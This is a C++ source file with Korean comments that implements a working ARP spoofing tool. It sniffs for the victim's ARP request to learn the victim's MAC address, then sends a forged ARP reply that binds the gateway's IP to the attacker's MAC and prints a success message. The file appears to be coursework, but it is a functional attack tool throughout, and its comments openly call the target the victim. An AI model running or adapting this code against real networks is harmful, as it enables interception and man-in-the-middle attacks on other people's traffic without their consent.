#include <ifaddrs.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

Mac get_mymac(char* dev); // 자신의 MAC 주소get
Mac get_packet(const char* dev, Ip sip_); // sender의 mac주소 get
void send_packet(char* dev, const Ip& target_ip, const Mac& target_mac, const Ip& spoofed_ip, const Mac& spoofed_mac); // ARP 응답 패킷을 생성하고 전송하는 함수
EthArpPacket Packet_make(const Mac& dmac, const Mac& smac, const Ip& sip, const Ip& tip, uint16_t opType); // ARP 패킷을 만드는 함수



Mac get_mymac(const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("Socket creation failed");
        return Mac::nullMac();
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl() failed");
        close(fd);
        return Mac::nullMac();
    }

    close(fd);

    return Mac(reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data));
}


Mac myMac ={0};



EthArpPacket Packet_make (
    const  Mac& dmac,
    const  Mac& smac,
    const Ip& sip,
    const Ip& tip ,
    uint16_t opType  )
{
    EthArpPacket packet;

    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);


    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(opType);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = sip;
    packet.arp_.tmac_ = (opType == ArpHdr::Request ? Mac("00:00:00:00:00:00") : dmac); // Set tmac based on opType
    packet.arp_.tip_ = tip;

    return packet;

}








Mac get_packet(const char* dev, Ip sip_) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live fail! %s(%s)\n", dev, errbuf);
        return Mac::nullMac(); // 실패 시 null Mac 반환
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break; // 에러 또는 EOF

        EthHdr* ethHdr = (EthHdr*)packet;
        if (ntohs(ethHdr->type_) == EthHdr::Arp) { // ARP 패킷인지 확인
            ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
            if (ntohs(arpHdr->op_) == ArpHdr::Request && arpHdr->sip_ == sip_) { // ARP Request이고, 송신자 IP가 일치하는지 확인
                pcap_close(handle);
                return arpHdr->smac_; // 송신자 MAC 주소 반환
            }
        }
    }

    pcap_close(handle);
    return Mac::nullMac(); // 일치하는 패킷을 찾지 못한 경우
}





// ARP 응답 패킷을 생성하고 전송하는 함수
void send_packet(char* dev, const Ip& target_ip, const Mac& target_mac, const Ip& spoofed_ip, const Mac& spoofed_mac) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        return;
    }

    // ARP 응답 패킷 생성
    EthArpPacket packet = Packet_make(target_mac, spoofed_mac, spoofed_ip, target_ip, ArpHdr::Reply);

    // 패킷 전송
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket failed with error: %s\n", pcap_geterr(handle));
    }

    // 리소스 정리
    pcap_close(handle);

}
void usage() {
    printf("syntax: send-arp-test wlan0 <sender ip> <target ip> \n");
    printf("sample: send-arp-test arg[0] arg[1] arg[2]\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1]; // 네트워크 인터페이스 이름
    Ip sender_ip = Ip(argv[2]); // 피해자(sender) IP
    Ip target_ip = Ip(argv[3]); // 게이트웨이(목표) IP


    Mac myMac = get_mymac(dev);   // 자신의 MAC 주소 가져오기

    Mac senderMac = get_packet(dev, sender_ip);    // 피해자의 MAC 주소 가져오기


    // ARP 스푸핑: 피해자의 ARP 테이블을 위조하여 나의 MAC 주소를 게이트웨이의 MAC 주소로 설정
    send_packet(dev, sender_ip, senderMac, target_ip, Mac(myMac));

    printf("ARP spoofing success: %s is now associated with %s\n", std::string(sender_ip).c_str(), std::string(myMac).c_str());

    return 0;
}



























